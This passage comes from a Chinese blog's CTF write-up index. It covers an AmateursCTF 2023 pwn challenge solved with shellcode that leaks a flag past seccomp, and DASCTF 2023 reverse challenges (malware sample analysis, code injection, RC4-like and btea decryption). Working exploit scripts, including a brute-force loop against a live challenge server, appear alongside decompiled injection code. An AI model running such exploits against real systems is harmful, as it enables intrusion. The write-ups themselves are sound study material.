MAP_PRIVATE, -1, 0);    int urandom = open(\"/dev/urandom\", O_RDONLY);    if (urandom &lt; 0) {        errx(1, \"open /dev/urandom failed\");    }    read(urandom, tmp, 4);    close(urandom);    unsigned int offset = *(unsigned int *)tmp &amp; ~0xFFF;    uint64_t addr = 0x1337000ULL + (uint64_t)offset;    char * flag = mmap((void *)addr, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);    if (flag == MAP_FAILED) {        errx(1, \"mapping flag failed\");    }    int fd = open(\"flag.txt\", O_RDONLY);    if (fd &lt; 0) {        errx(1, \"open flag.txt failed\");    }    read(fd, flag, 128);    close(fd);    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);    if (code == MAP_FAILED) {        errx(1, \"mmap failed\");    }    char * stack = mmap((void *)0x13371337000, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_GROWSDOWN, -1, 0);    if (stack == MAP_FAILED) {        errx(1, \"failed to map stack\");    }    printf(\"&gt; \");    read(0, code, 0x100000);    setup_seccomp();    asm volatile(        \".intel_syntax noprefix\\n\"        \"mov rbx, 0x13371337\\n\"        \"mov rcx, rbx\\n\"        \"mov rdx, rbx\\n\"        \"mov rdi, rbx\\n\"        \"mov rsi, rbx\\n\"        \"mov rsp, 0x13371337000\\n\"        \"mov rbp, rbx\\n\"        \"mov r8,  rbx\\n\"        \"mov r9,  rbx\\n\"        \"mov r10, rbx\\n\"        \"mov r11, rbx\\n\"        \"mov r12, rbx\\n\"        \"mov r13, rbx\\n\"        \"mov r14, rbx\\n\"        \"mov r15, rbx\\n\"        \"jmp rax\\n\"        \".att_syntax prefix\\n\"        :        : [code] \"rax\" (code)        :    );}‍  沙箱​​‍‍由于程序已经open(flag)了 ，所以我们只要使用 read 读flag,然后再用 write输出出来就OK了‍下面等会在 jmp rax 出打个断点​​‍  测试 脚本from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)#io = remote()gdb.attach(io,'b *0x0401594')pay = asm('''          nop          nop          nop          nop''')sl(pay)io.interactive()‍​​‍  上面的啥也不是，接下来我们来详细分析一下这题…..（分析了一下午）‍​扎心了，呜呜呜，在大佬眼了就是瞬秒题      真正的开始    OK ，总的来说这题还是比较有意思的，  经过测试，这题最完美的解决方法就是爆破地址‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'#libelf = './libseccomp.so.2.5.3'libelf = '/lib/x86_64-linux-gnu/libseccomp.so.2'context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']elf =  ELF(binary)libc = ELF(libelf)io = process(binary)#io = remote('amt.rs',31173)gdb.attach(io,'b *0x0401594')offset = 0x1000 * 41   # 主要是这个偏移地址，怎么得到的，先不用管，等会就知道了# (在一台机器上偏移是固定的, 不同的机器又是不一样的）# sc = f\"\"\"mov rsi,[{elf.got['seccomp_init']}]sub rsi,{libc.sym['seccomp_init']}add rsi,{offset}mov rsi,[rsi]and esi,0xFFFFF000add rsi,0x1337000mov rax, 1mov rdi, 1mov rdx, 0x100syscall\"\"\"ru('&gt; ')sl(asm(sc))io.interactive()  由于 NO PIE 所以我们直接从 got 里拿 libc上的地址​​​‍​libc.sym['seccomp_init']​  计算一个 libc 上的基地址， 我们就选取 ​/usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.4​ 的基地址，其实其他的基地址应该也可以‍​​​​执行完这个后，rsi 里的地址指向的就是​​就是 从 /dev/urandom​ 里读的随机数(我们先叫它key)，通过这个随机数我们就可以 经过计算就得到用来存放flag的随机地址.​​然后 用 key 通过这两个计算就可以得到 flag的地址了, and eax, 0FFFFF000h​ add rax, 1337000h​​​​然后就是 flag了​​下面就是 SYS_write 输出flag就行了​​  最终通用 exploit看重点，其实只要我们 以 0x1000 的倍数去才地址就可以了，最多最多就 0xff就可以得到 我们想要的地址.也要根据实际的  libseccomp.so.2.5.3版本from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'#libelf = './libseccomp.so.2.5.3'libelf = '/lib/x86_64-linux-gnu/libseccomp.so.2'context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']elf =  ELF(binary)libc = ELF(libelf)for i in range(42,255):    io = process(binary)    io = remote('amt.rs',31173)    #gdb.attach(io,'b *0x0401594')    offset = 0x1000 * i    sc = f\"\"\"    mov rsi,[{elf.got['seccomp_init']}]    sub rsi,{libc.sym['seccomp_init']}    add rsi,{offset}     # 重点    mov rsi,[rsi]    and esi,0xFFFFF000    add rsi,0x1337000    mov rax, 1    mov rdi, 1    mov rdx, 0x100    syscall    \"\"\"    ru('&gt; ')    sl(asm(sc))    print(i)    try:        f = io.recv()        print(f)        if (b'flag' in f )or (b'FLAG' in f) or(b'ctf' in f) or (b'CTF' in f):            print(f)            break    except:        pass    io.close()‍​​​amateursCTF{3xc3pt10n_suppr3ss10n_ftw}​异常抑制ftw  参考AmateursCTF 2023 Write-Up - U+E000 私用領域 (hatenablog.com)‍‍简单操作系统 (amateurs.team)frog-math (amateurs.team)‍RE writeups‍业余爱好者CTF 2023 - 逆向工程文章 - FazeCT 博客"
  },
  
  {
    "title": "DASCTF 2023六月挑战赛｜二进制专项",
    "url": "/posts/DASCTF-2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-06-04 00:00:00 +0800",
    





    
    "snippet": "二进制专项-签到‍简单统计下参与人数，祝大家玩得开心~DASCTF{Welcome_to_DASCTF5}‍Reverse-careful‍  题目给出了一个恶意样本,请分析出样本请求服务器的域名(flag的形式为DASCTF{md5(域名)}) 其中md5值都是小写‍拿到题目直接 IDA Pro 打开, 一眼就可以看 gethostbyname();动态调试可以获取name的值,但是这个地...",
    "content": "二进制专项-签到‍简单统计下参与人数，祝大家玩得开心~DASCTF{Welcome_to_DASCTF5}‍Reverse-careful‍  题目给出了一个恶意样本,请分析出样本请求服务器的域名(flag的形式为DASCTF{md5(域名)}) 其中md5值都是小写‍拿到题目直接 IDA Pro 打开, 一眼就可以看 gethostbyname();动态调试可以获取name的值,但是这个地方获取的name不是真正的‍​​‍直接 快捷键 x  看 gethostbyname() 交叉引用 还有另一处‍​​‍直在这里下断点，然后动态调试‍​​‍得到 域名 Just_An_APIH00k11.com‍​​from hashlib import md5def md5sum(string):    return md5(string.encode('utf-8')).hexdigest()    passx = md5sum('Just_An_APIH00k11.com')print(x)# f18566f93963f72f463fdfa2d163c37c# flag{f18566f93963f72f463fdfa2d163c37c}‍Reverse-babyRe‍  so easy‍  根据字符串 error! 引用处一步一步往上找交叉引用的函数‍应该是函数的主要逻辑的地方了‍__int64 __fastcall sub_140007A80(int a1, __int64 a2){  char *v2; // rdi  __int64 i; // rcx  char v5[32]; // [rsp+0h] [rbp-40h] BYREF  char v6; // [rsp+40h] [rbp+0h] BYREF  DWORD dwProcessId; // [rsp+44h] [rbp+4h]  HANDLE v8; // [rsp+68h] [rbp+28h]  char Parameter[132]; // [rsp+90h] [rbp+50h] BYREF  int j; // [rsp+114h] [rbp+D4h]  HRSRC hResInfo; // [rsp+138h] [rbp+F8h]  size_t Size; // [rsp+154h] [rbp+114h]  HGLOBAL hResData; // [rsp+178h] [rbp+138h]  void *Src; // [rsp+198h] [rbp+158h]  void *v15; // [rsp+1B8h] [rbp+178h]  __int64 v16; // [rsp+1D8h] [rbp+198h]  __int64 v17; // [rsp+1F8h] [rbp+1B8h]  int k; // [rsp+214h] [rbp+1D4h]  __int64 v19; // [rsp+2E8h] [rbp+2A8h]  v2 = &amp;v6;  for ( i = 130i64; i; --i )  {    *(_DWORD *)v2 = -858993460;    v2 += 4;  }  sub_1400012A8(&amp;unk_1400140F4);  dwProcessId = GetCurrentProcessId();  v8 = OpenProcess(0x1FFFFFu, 0, dwProcessId);  if ( a1 != 2 )    exit(0);  for ( j = 0; ; ++j )  {    v19 = j;    if ( j &gt;= strlen(*(const char **)(a2 + 8)) )      break;    Parameter[j] = *(_BYTE *)(*(_QWORD *)(a2 + 8) + j);  }  hResInfo = FindResourceW(0i64, (LPCWSTR)0x65, L\"cod\");  LODWORD(Size) = SizeofResource(0i64, hResInfo);  hResData = LoadResource(0i64, hResInfo);  Src = LockResource(hResData);  v15 = malloc((unsigned int)Size);  memcpy(v15, Src, (unsigned int)Size);  sub_140001087(v15);  v16 = qword_14000FC30(v8, 0i64, 874i64, 4096i64, 64);  qword_14000FC28(v8, v16, v15, 874i64, 0i64);  v17 = qword_14000FC18(v8, 0i64, 0i64, v16, Parameter, 0, 0i64);  Sleep(0x1F4u);  for ( k = 0; k &lt; 44; ++k )    ;  CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, Parameter, 0, 0i64);  Sleep(0x190u);  sub_140001253(v5, &amp;unk_14000BEE0);  return 0i64;}  直接看的话还不是很好看，我先修复下函数的名字  可以看注释‍__int64 __fastcall sub_140007A80(int argv_value, char **argv){  char *v2; // rdi  __int64 i; // rcx  char v5[32]; // [rsp+0h] [rbp-40h] BYREF  char v6; // [rsp+40h] [rbp+0h] BYREF  DWORD dwProcessId; // [rsp+44h] [rbp+4h]  HANDLE v8; // [rsp+68h] [rbp+28h]  char Parameter[132]; // [rsp+90h] [rbp+50h] BYREF  int j; // [rsp+114h] [rbp+D4h]  HRSRC hResInfo; // [rsp+138h] [rbp+F8h]  size_t Size; // [rsp+154h] [rbp+114h]  HGLOBAL hResData; // [rsp+178h] [rbp+138h]  void *Src; // [rsp+198h] [rbp+158h]  void *data; // [rsp+1B8h] [rbp+178h]  __int64 v16; // [rsp+1D8h] [rbp+198h]  __int64 v17; // [rsp+1F8h] [rbp+1B8h]  int k; // [rsp+214h] [rbp+1D4h]  __int64 v19; // [rsp+2E8h] [rbp+2A8h]  v2 = &amp;v6;  for ( i = 130i64; i; --i )  {    *v2 = -858993460;    v2 += 4;  }  sub_1400012A8(&amp;unk_1400140F4);                // 检测调试，需要给patch掉，直接进去把里面的代码改成 ret  dwProcessId = GetCurrentProcessId();  v8 = OpenProcess(0x1FFFFFu, 0, dwProcessId);  if ( argv_value != 2 )                        // 必须有2个参数    exit(0);  for ( j = 0; ; ++j )  {    v19 = j;    if ( j &gt;= strlen(argv[1]) )      break;    Parameter[j] = argv[1][j];                  // 将第一个参数赋值给 Parameter                                                // bbre.exe flagstrings  }  hResInfo = FindResourceW(0i64, 0x65, L\"cod\");  LODWORD(Size) = SizeofResource(0i64, hResInfo);  hResData = LoadResource(0i64, hResInfo);  Src = LockResource(hResData);  data = malloc(Size);  memcpy(data, Src, Size);  Jmp_Xor_data(data);                           // 这里一个异或加解密的操作 长度是 874  v16 = qword_14000FC30(v8, 0i64, 874i64, 4096i64, 64);  qword_14000FC28(v8, v16, data, 874i64, 0i64);  v17 = qword_14000FC18(v8, 0i64, 0i64, v16, Parameter, 0, 0i64);// Parameter 只有在这个函数才被加密  Sleep(0x1F4u);  for ( k = 0; k &lt; 44; ++k )    ;  CreateThread(0i64, 0i64, StartAddress, Parameter, 0, 0i64);// startAddress 是一个检测flag的   Sleep(0x190u);  sub_140001253(v5, &amp;unk_14000BEE0);  return 0i64;}原来还可以这样读资源文件​‍  Xor_data()‍__int64 __fastcall Xor_data(char a1[]){  __int64 result; // rax  int i; // [rsp+24h] [rbp+4h]  result = sub_1400012A8(&amp;unk_1400140F4);  for ( i = 0; i &lt; 874; ++i )  {    a1[i] ^= byte_14000F000[i % 4];    result = (unsigned int)(i + 1);  }  return result;}需要注意的是 byte_14000F000,​如果 程序处于调试状态他会修改 byte_14000F000,这里等会给它 patch 掉‍​​‍  IsDebuggerPresent()#返回值如果当前进程在调试器上下文中运行，则返回值为非零。如果当前进程未在调试器的上下文中运行，则返回值为零。‍byte_14000F000 初始值是18h, 57h, 68h, 64h‍经过动态调试后 才发现执行完 Jmp_Xor_data() 后， data 是一堆代码‍​​‍  动态调试需要传参​直接去看 data,data里存的地址才是数据‍​​如果说你看到 or      [rcx+43F8ECh], al​ 就说明，初始的 byte_14000F000 还是被改了这样的话，可以断点在异或解密的前一条直接，然后把 byte_14000F000 改回去​​‍随便打个断点​​直接给它改回去‍​​然后继续运行动态解密完后我们在看下data有些花指令，我们给它处理一下​花指令​​出来完花指令后 快捷键p 创建函数 然后可以直接F5 看C 伪代码和里面我写好的注释‍__int64 __fastcall sub_22777CDEDAD(char a1[]){  char *v1; // rdi  __int64 i; // rcx  __int64 result; // rax  char v4; // [rsp+20h] [rbp+0h] BYREF  char v5[292]; // [rsp+30h] [rbp+10h] BYREF  unsigned int k; // [rsp+154h] [rbp+134h]  unsigned int v7; // [rsp+174h] [rbp+154h]  unsigned int v8; // [rsp+194h] [rbp+174h]  int v9; // [rsp+1B4h] [rbp+194h]  char v10[44]; // [rsp+1D8h] [rbp+1B8h] BYREF  unsigned int v11; // [rsp+204h] [rbp+1E4h]  char *__attribute__((__org_arrdim(0,0))) j; // [rsp+228h] [rbp+208h]  int v13; // [rsp+244h] [rbp+224h]  __int64 v14; // [rsp+3D8h] [rbp+3B8h]  v1 = &amp;v4;  for ( i = 150i64; i; --i )  {    *v1 = -858993460;    v1 += 4;  }  memset(v5, 0, 0x101ui64);  qmemcpy(v10, \"]Bb)\", 4);  v10[4] = 3;  v10[5] = 54;  v10[6] = 71;  v10[7] = 65;  v10[8] = 21;  v10[9] = 54;  v11 = 0;  for ( j = a1; *j; ++j )    ++v11;  for ( k = 0; k &lt; 0x100; ++k )    v5[k] = k;  v8 = 0;  v7 = 0;  for ( k = 0; k &lt; 0x100; ++k )  {    v9 = v5[k];    v7 = (v10[v8] + v9 + 2 * v7) % 0x100;    v5[k] = v5[v7];    v5[v7] = v9;    if ( ++v8 &gt;= 0xA )      v8 = 0;  }  v8 = 0;  sub_22777CDEF9E();                            // 没用，等会nop掉; 随便在 nop 处下个断点，来获取上面生成v5的值，用来给下面的解密  v7 = v8;  for ( k = 0; ; ++k )  {    result = v11;    if ( k &gt;= v11 )      break;    v7 = (v8 + v7) % 0x100;    v8 = (v5[v7] + v8) % 0x100;    v9 = v5[v7];    v5[v7] = v5[v8];    v5[v8] = v9;    v13 = v5[(v5[v7] + v8 + v5[v8]) % 0x100];    a1[k] ^= v13;                               // 加密处，毫无疑问 a1 就是我们传入的flag    v14 = k;    a1[k] += k % 0xD;  }  return result;}nop 掉 call sub_22777CDEF9E‍​​‍然后打断点，然后F9运行到这‍​F9 后，然后把这个int 3 也 nop 掉, 接下在上面的开头处 快捷键p ,然后f5 看C 伪代码​​再把上面的 v5 给他提取出来​​密文在Xor_data()函数里可以找到‍​​然后写解密脚本v5 = [  0x04, 0xFD, 0x67, 0xF4, 0x3F, 0x13, 0xC6, 0x86, 0x29, 0xAA,   0x89, 0x68, 0x93, 0x41, 0x6B, 0x9F, 0x95, 0x7C, 0x96, 0x87,   0x0C, 0x1C, 0x18, 0x7E, 0x23, 0x51, 0x2B, 0x72, 0x55, 0x94,   0x75, 0x3E, 0xFE, 0x00, 0x16, 0x30, 0x9B, 0x9C, 0xF6, 0x43,   0x5F, 0x69, 0x85, 0xE2, 0xE7, 0xAB, 0x7A, 0x5A, 0x0A, 0xA6,   0x81, 0x77, 0x17, 0x6C, 0xF2, 0x33, 0x6D, 0x35, 0x49, 0x0B,   0x61, 0x06, 0x34, 0xD7, 0x4B, 0x9E, 0xA3, 0x3C, 0xB5, 0x5C,   0x48, 0xB3, 0x05, 0xDC, 0xA7, 0x80, 0x71, 0x09, 0xAE, 0x28,   0x5B, 0xA8, 0xE6, 0x44, 0x14, 0xE3, 0x63, 0x4E, 0xF3, 0x1E,   0xC1, 0xDF, 0x26, 0x46, 0x07, 0x2F, 0xB1, 0x0D, 0xED, 0x6A,   0x19, 0xD1, 0xDE, 0x5E, 0x6F, 0x1D, 0x97, 0xC8, 0x66, 0xD6,   0x7B, 0xA0, 0x62, 0x3A, 0x40, 0xC5, 0x59, 0x1B, 0xCF, 0x83,   0x50, 0xC2, 0x8F, 0x58, 0xE5, 0xEA, 0x84, 0x38, 0x11, 0xC9,   0x37, 0x2E, 0xCE, 0xB8, 0x10, 0x90, 0xD9, 0x98, 0x45, 0xCD,   0xD5, 0x03, 0x57, 0x99, 0x25, 0x08, 0x74, 0xDD, 0x7D, 0xD4,   0x24, 0x12, 0x22, 0xB9, 0xBE, 0x0E, 0x4A, 0x20, 0xAF, 0xB4,   0x4F, 0x21, 0xF5, 0xCA, 0xEB, 0x0F, 0x9D, 0x36, 0xD0, 0xC3,   0x91, 0x3B, 0x2C, 0xEE, 0x1F, 0xE0, 0xB7, 0x70, 0xA2, 0x56,   0x9A, 0xB2, 0xA1, 0x60, 0xC0, 0xCC, 0xAC, 0x7F, 0xF9, 0x8A,   0xBD, 0xCB, 0x8C, 0xB6, 0x8D, 0xDB, 0x39, 0xFC, 0xD3, 0x88,   0xDA, 0x4D, 0x78, 0xFB, 0xBF, 0x1A, 0x02, 0x76, 0xBC, 0x47,   0x64, 0xE4, 0xA4, 0x4C, 0x15, 0x5D, 0xD2, 0xA5, 0x2D, 0xAD,   0xF7, 0xBA, 0x54, 0xF0, 0x8E, 0xA9, 0xEC, 0x52, 0x27, 0x42,   0xD8, 0xBB, 0xB0, 0x53, 0x31, 0x82, 0x8B, 0xEF, 0xC7, 0xF8,   0x32, 0xF1, 0xE9, 0xE8, 0x01, 0xFF, 0xC4, 0xFA, 0xE1, 0x65,   0x79, 0x73, 0x92, 0x6E, 0x2A, 0x3D, 0x00  ]flag = [0] * 45flag[0] = 0xF7flag[1] = 0x2Eflag[2] = 0x34flag[3] = 0xF0flag[4] = 0x72flag[5] = 0xCFflag[6] = 94flag[7] = 10flag[8] = 0xBBflag[9] = 0xECflag[10] = 0xB1flag[11] = 0x2Bflag[12] = 0x70flag[13] = 0x88flag[14] = 0x88flag[15] = 0xEDflag[16] = 0x46flag[17] = 0x38flag[18] = 0xDBflag[19] = 0xDAflag[20] = 0x6Cflag[21] = 0xBDflag[22] = 0xD4flag[23] = 6flag[24] = 0x77flag[25] = 0xF2flag[26] = 0xCFflag[27] = 0x56flag[28] = 0x88flag[29] = 0xC6flag[30] = 0x31flag[31] = 0xD2flag[32] = 0xB7flag[33] = 90flag[34] = 0xC1flag[35] = 0x42flag[36] = 0xB0flag[37] = 0xF4flag[38] = 72flag[39] = 0x37flag[40] = 0xF5flag[41] = 0x2Cflag[42] = 245flag[43] = 88v8 = 0v7 = 0for k in range(44):    v7 = (v8 + v7) % 0x100    v8 = (v5[v7] + v8) % 0x100    v9 = v5[v7]    v5[v7] = v5[v8]    v5[v8] = v9    v13 = v5[(v5[v7] + v8 + v5[v8]) % 0x100]    flag[k] -= k % 0xD    flag[k] ^= v13    flag[k] = flag[k] % 128print(flag)print(''.join(map(chr,flag)))[68, 65, 83, 67, 84, 70, 123, 48, 51, 52, 52, 54, 99, 50, 99, 45, 100, 102, 102, 55, 45, 49, 49, 101, 100, 45, 57, 50, 56, 53, 45, 53, 52, 101, 49, 97, 100, 57, 56, 100, 54, 52, 57, 125, 0]DASCTF{03446c2c-dff7-11ed-9285-54e1ad98d649}‍Reverse-ez_exe‍‍一共三个文件​​ez_exe.exe 是 python3.11 打包的‍​​用 python3.11 执行 pyinstxtractor.py 去解包​再用 Pycdc 去还原 python源代码#=[09:17:03]-➤  /opt/reverse/Pycdc ez_py.pyc # Source Generated with Decompyle++# File: ez_py.pyc (Python 3.11)import ctypesfrom time import *from ctypes import *from ctypes import wintypesfrom hashlib import md5class _STARTUPINFO(Structure):    _fields_ = [        ('cb', c_ulong),        ('lpReserved', c_char_p),        ('lpDesktop', c_char_p),        ('lpTitle', c_char_p),        ('dwX', c_ulong),        ('dwY', c_ulong),        ('dwXSize', c_ulong),        ('dwYSize', c_ulong),        ('dwXCountChars', c_ulong),        ('dwYCountChars', c_ulong),        ('dwFillAttribute', c_ulong),        ('dwFlags', c_ulong),        ('wShowWindow', c_ushort),        ('cbReserved2', c_ushort),        ('lpReserved2', c_char_p),        ('hStdInput', c_ulong),        ('hStdOutput', c_ulong),        ('hStdError', c_ulong)]class _PROCESS_INFORMATION(Structure):    _fields_ = [        ('hProcess', c_void_p),        ('hThread', c_void_p),        ('dwProcessId', c_ulong),        ('dwThreadId', c_ulong)]StartupInfo = _STARTUPINFO()ProcessInfo = _PROCESS_INFORMATION()key1 = bytes(md5(b'bin1bin1bin1').hexdigest().encode())file = open('bin1', 'rb').read()arr = range(len(file))()open('bin1', 'wb').write(bytes(arr))sleep(0)bet = ctypes.windll.kernel32.CreateProcessA(b'bin1', ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), byref(StartupInfo), byref(ProcessInfo))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ProcessInfo.hProcess), ctypes.c_int(-1))open('bin1', 'wb').write(file)直接看的话，好像有点奇怪，key1 都没有调用的地方主要还是解密了bin1, 用 python3.11 运行 ez_py.pyc,会生成一个 gmon.out​运行后，bin1 会从密文状态解密成一个 PE32 可执行程序，‍​​​​‍HeD 打开 这个 ez_py.pyc 然后将 bin1 替换成bin2, 然后再去运行这个 ez_py.pyc‍​‍也是意料之中成长解密了bin2也运行了‍​​​​接下来用 IDA Pro 分析 bin2‍一个 btea 加密int __cdecl main(int argc, const char **argv, const char **envp){  int flag[11]; // [esp+10h] [ebp-B8h]  int key[4]; // [esp+3Ch] [ebp-8Ch] BYREF  int v6[12]; // [esp+4Ch] [ebp-7Ch] BYREF  char Str[50]; // [esp+7Eh] [ebp-4Ah] BYREF  int k; // [esp+B0h] [ebp-18h]  int j; // [esp+B4h] [ebp-14h]  size_t i; // [esp+B8h] [ebp-10h]  char *v11; // [esp+BCh] [ebp-Ch]  __main();  printf(\"please input your flag:\\n\");  scanf(\"%s\", Str);  if ( strlen(Str) != 44 )  {    MessageBoxA(0, \"worng length!\", &amp;Caption, 0);    exit(0);  }  v11 = Str;  for ( i = 0; strlen(Str) &gt;&gt; 2 &gt; i; ++i )  {    v6[i] = *(_DWORD *)v11;    v11 += 4;  }  key[0] = 0x4B5F;  key[1] = 0xDEAD;  key[2] = 0x11ED;  key[3] = 0xB3CC;  btea((unsigned int *)v6, 11, key);            // 加密  for ( j = 0; j &lt;= 10; ++j )    ;  flag[0] = 0xCC45699D;  flag[1] = 0x683D5352;  flag[2] = 0xB8BB71A0;  flag[3] = 0xD3817AD;  flag[4] = 0x7547E79E;  flag[5] = 0x4BDD8C7C;  flag[6] = 0x95E25A81;  flag[7] = 0xC4525103;  flag[8] = 0x7049B46F;  flag[9] = 0x5417F77C;  flag[10] = 0x65567138;  for ( k = 0; k &lt;= 10; ++k )  {    if ( flag[k] != v6[k] )    {      MessageBoxA(0, \"error!\", &amp;Caption, 0);      exit(0);    }  }  MessageBoxA(0, \"right!\", &amp;Caption, 0);  return 0;}  bteaint __cdecl btea(unsigned int a1[], int a2, int a3[]){  unsigned int *v3; // eax  int *v4; // eax  int result; // eax  unsigned int *v6; // eax  int v7; // [esp+8h] [ebp-20h]  int v8; // [esp+8h] [ebp-20h]  int v9; // [esp+Ch] [ebp-1Ch]  int v10; // [esp+Ch] [ebp-1Ch]  unsigned int j; // [esp+10h] [ebp-18h]  int i; // [esp+10h] [ebp-18h]  unsigned int v13; // [esp+14h] [ebp-14h]  unsigned int v14; // [esp+14h] [ebp-14h]  unsigned int v15; // [esp+18h] [ebp-10h]  unsigned int v16; // [esp+1Ch] [ebp-Ch]  int a2a; // [esp+34h] [ebp+Ch]  if ( a2 &lt;= 1 )  {    if ( a2 &lt; -1 )    {      a2a = -a2;      v10 = 52 / a2a + 6;      v14 = 2033695134 * v10;      v16 = *a1;      do      {        v8 = (v14 &gt;&gt; 2) &amp; 3;        for ( i = a2a - 2; i; --i )        {          v6 = &amp;a1[i];          *v6 -= ((v16 ^ v14) + (a1[i - 1] ^ a3[v8 ^ i &amp; 3])) ^ (((4 * v16) ^ (a1[i - 1] &gt;&gt; 5))                                                               + ((v16 &gt;&gt; 3) ^ (16 * a1[i - 1])));          v16 = *v6;        }        *a1 -= (((4 * v16) ^ (a1[a2a - 1] &gt;&gt; 5)) + ((v16 &gt;&gt; 3) ^ (16 * a1[a2a - 1]))) ^ ((v16 ^ v14)                                                                                       + (a1[a2a - 1] ^ a3[v8]));        result = *a1;        v16 = *a1;        v14 -= 2033695134;        --v10;      }      while ( v10 );    }  }  else  {    v9 = 52 / a2;    v13 = 0;    v15 = a1[a2 - 1];    do    {      v13 += 0x7937B99E;      v7 = (v13 &gt;&gt; 2) &amp; 3;      for ( j = 0; j &lt; a2 - 1; ++j )      {        v3 = &amp;a1[j];        *v3 += ((a1[j + 1] ^ v13) + (v15 ^ a3[v7 ^ j &amp; 3])) ^ (((4 * a1[j + 1]) ^ (v15 &gt;&gt; 5))                                                             + ((a1[j + 1] &gt;&gt; 3) ^ (16 * v15)));        v15 = *v3;      }      v4 = (int *)&amp;a1[a2 - 1];      *v4 += ((*a1 ^ v13) + (v15 ^ a3[v7 ^ j &amp; 3])) ^ (((4 * *a1) ^ (v15 &gt;&gt; 5)) + ((*a1 &gt;&gt; 3) ^ (16 * v15)));      result = *v4;      v15 = result;      --v9;    }    while ( v9 );  }  return result;}‍baidu 到了俩解密的，需要修改部分代码，也简单，改完解密直接flag‍  btea解密脚本1#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt; #define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z); //long btea(long* v, long n, long* k) {int btea(int* v, int n, int* k) {\tunsigned long z=v[n-1], y=v[0], sum=0, e, DELTA=0x7937B99E;\tlong p, q ;\tif (n &gt; 1) {          /* Coding Part */\t\t//q = 6 + 52/n;\t\tq = 52/n;\t\twhile (q-- &gt; 0) {\t\t\tsum += DELTA;\t\t\te = (sum &gt;&gt; 2) &amp; 3;\t\t\tfor (p=0; p&lt;n-1; p++) y = v[p+1], z = v[p] += MX;\t\t\ty = v[0];\t\t\tz = v[n-1] += MX;\t\t}\t\treturn 0 ; \t} else if (n &lt; -1) {  /* Decoding Part */\t\tn = -n;\t\t//q = 6 + 52/n;\t\tq =  52/n;\t\tsum = q*DELTA ;\t\twhile (sum != 0) {\t\t\te = (sum &gt;&gt; 2) &amp; 3;\t\t\tfor (p=n-1; p&gt;0; p--) z = v[p-1], y = v[p] -= MX;\t\t\tz = v[n-1];\t\t\ty = v[0] -= MX;\t\t\tsum -= DELTA;\t\t}\t\treturn 0;\t}\treturn 1;}int main(int argc, char const *argv[]){    int key[4]={0};    key[0] = 0x4B5F;    key[1] = 0xDEAD;    key[2] = 0x11ED;    key[3] = 0xB3CC;    int flag[11] = {0};    flag[0] = 0xCC45699D;    flag[1] = 0x683D5352;    flag[2] = 0xB8BB71A0;    flag[3] = 0xD3817AD;    flag[4] = 0x7547E79E;    flag[5] = 0x4BDD8C7C;    flag[6] = 0x95E25A81;    flag[7] = 0xC4525103;    flag[8] = 0x7049B46F;    flag[9] = 0x5417F77C;    flag[10] = 0x65567138;    btea(flag,-11,key);    printf(\"%s\\n\",flag);    return 0;}  btea解密脚本2#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x7937B99E// #define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))   void btea(uint32_t *v, int n, uint32_t const key[4]) {    uint32_t y, z, sum;    unsigned p, rounds, e;    if (n &gt; 1) {          /* Coding Part */      rounds = 52/n;      //rounds = 6 + 52/n;      sum = 0;      z = v[n-1];      do {        sum += DELTA;        e = (sum &gt;&gt; 2) &amp; 3;        for (p=0; p&lt;n-1; p++) {          y = v[p+1];          z = v[p] += MX;        }        y = v[0];        z = v[n-1] += MX;      } while (--rounds);    } else if (n &lt; -1) {  /* Decoding Part */      n = -n;      rounds = 52/n;      //rounds = 6 + 52/n;      sum = rounds*DELTA;      y = v[0];      do {        e = (sum 